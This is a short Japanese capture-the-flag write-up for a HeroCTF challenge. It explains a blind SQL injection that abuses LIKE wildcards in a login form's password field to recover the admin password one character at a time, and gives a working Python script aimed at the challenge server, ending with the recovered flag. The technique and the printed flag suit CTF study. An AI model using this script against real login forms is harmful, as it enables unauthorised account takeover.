# Writeup

前回（`PwnQL #1`）と同じページで、adminのパスワードを探す。

LIKE句内で先頭文字列から順にブラインドSQLインジェクションを行う。

例えば、`s%`でログインできるならばpasswordは`s`から始まることがわかる。

```py
import requests
import string

with requests.Session() as session:
    r = session.get("http://chall1.heroctf.fr:8080/index.php")
    chars = string.printable
    chars = chars.replace('%','')
    password = ""
    while True:
        for c in chars :
            data = {'username':'admin', 'password': password + c + "%"}
            r = session.post("http://chall1.heroctf.fr:8080/index.php",data=data)
            if "Hero{pwnQL_b4sic_0ne_129835}" in r.text :
                break
        if c == chars[-1]:
            break
        password += c
        print(password)
```

<!-- Hero{s3cur3p@ss} -->